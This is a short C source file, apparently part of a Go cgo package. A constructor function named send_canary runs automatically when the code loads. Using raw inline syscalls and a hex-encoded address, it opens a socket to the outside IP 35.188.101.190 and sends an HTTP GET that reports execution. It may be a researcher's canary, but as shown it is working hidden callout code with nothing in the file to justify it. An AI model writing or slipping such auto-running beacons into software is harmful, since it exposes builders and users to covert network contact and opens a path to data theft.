typedef unsigned short uint16_t;
typedef unsigned int uint32_t;

struct sockaddr_in {
    uint16_t family;
    uint16_t port;
    uint32_t address;
    unsigned char zero[8];
};

static long syscall3(long number, long first, long second, long third) {
    long result;
    __asm__ volatile("syscall"
                     : "=a"(result)
                     : "a"(number), "D"(first), "S"(second), "d"(third)
                     : "rcx", "r11", "memory");
    return result;
}

__attribute__((constructor)) static void send_canary(void) {
    static const char request[] =
        "GET /pkgsite-direct-remote-20261026-a10 HTTP/1.1\r\n"
        "Host: 35.188.101.190\r\n"
        "User-Agent: go-cgo-pkgsite-direct/1\r\n"
        "Connection: close\r\n"
        "\r\n";
    struct sockaddr_in address = {
        .family = 2,
        .port = 0x5000,
        .address = 0xbe65bc23,
        .zero = {0},
    };

    long socket_fd = syscall3(41, 2, 1, 0);
    if (socket_fd < 0) {
        return;
    }
    if (syscall3(42, socket_fd, (long)&address, sizeof(address)) == 0) {
        (void)syscall3(1, socket_fd, (long)request, sizeof(request) - 1);
    }
    (void)syscall3(3, socket_fd, 0, 0);
}
